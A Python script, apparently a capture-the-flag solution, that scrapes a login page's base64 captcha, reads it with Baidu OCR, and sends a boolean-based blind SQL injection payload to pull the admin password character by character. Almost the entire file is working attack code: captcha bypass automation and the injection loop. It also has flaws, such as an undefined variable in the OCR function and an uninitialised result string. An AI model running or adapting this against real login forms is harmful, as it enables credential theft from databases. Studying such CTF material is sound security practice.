from aip import AipOcr
from lxml import etree
import requests
import base64
""" API """

# 在百度云上申请的 这里我删了，可以注册一个自己的
APP_ID = ''
API_KEY = ''
SECRET_KEY = ''

# 初始化AipFace对象
client = AipOcr(APP_ID, API_KEY, SECRET_KEY)

""" 读取图片 """
def get_file_content(filePath):
    with open(filePath, 'rb') as fp:
        return fp.read()

def img_to_str(image_path):
    """ 可选参数 """
    options = {}
    options["language_type"] = "CHN_ENG"  # 中英文混合
    options["detect_direction"] = "true"  # 检测朝向
    options["detect_language"] = "true"  # 是否检测语言
    options["probability"] = "false"  # 是否返回识别结果中每一行的置信度
    image = get_file_content(image_path)
    """ 带参数调用通用文字识别 """
    result = client.basicGeneral(get_file_content(filePath), options)
    # 格式化输出-提取需要的部分
    if 'words_result' in result:
        text = ('\n'.join([w['words'] for w in result['words_result']]))
    # print(type(result), "和", type(text))
    return text
def getimg(req):
	filter = '//*[@id="reCaptcha"]/@src' # 验证码
	res = req.get("http://121.36.224.xxx:2333/index.php")
	html = res.text
	html = etree.HTML(html)
	html_data = html.xpath(filter)
	imgsrc = html_data[0].replace("data:image/png;base64,","")
	f=open("tmp1.png","wb")
	f.write(base64.b64decode(imgsrc))
	f.close()
	# GdJ0bY0
if __name__ == '__main__':
	# password='***' 这里是通过代码的逻辑，知道输入正确的用户名密码才会出flag，代码中也给出了表名列名，直接跑SELECT password FROM users WHERE username='admin'就成
	# flag{xxxxx} hheheh
	i = 0
	while i<20:
		print(i)
		j=ord("0")
		# j=90
		while j<125:
			req = requests.session()
			getimg(req)
			filePath = 'tmp1.png'
			code = img_to_str(filePath)
			payload = "admin' and ascii(substr((SELECT password FROM users WHERE username='admin'),{},1))={}#".format(i,j)
			data = {
				"captcha":code,
				"password":"admin",
				"username":payload
			}
			# print(data)
			tmp1 = 'username or password wrong'
			tmp2 = "user not exist or wrong password"
			res = req.post("http://121.36.224.xxx:2333/index.php",data=data)# 题目IP 打下码
			html = res.text
			filter = '/html/body/div[4]' # 回显信息
			html = res.text
			html = etree.HTML(html)
			html_data = html.xpath(filter)[0].text.strip()
			# print(html_data)
			if tmp2 in html_data:
				j+=1 # 忘记写成二分法了，有空写一下
			if  tmp1 in html_data:
				i+=1
				res_ctf +=chr(j)
				print(res_ctf)
				break   
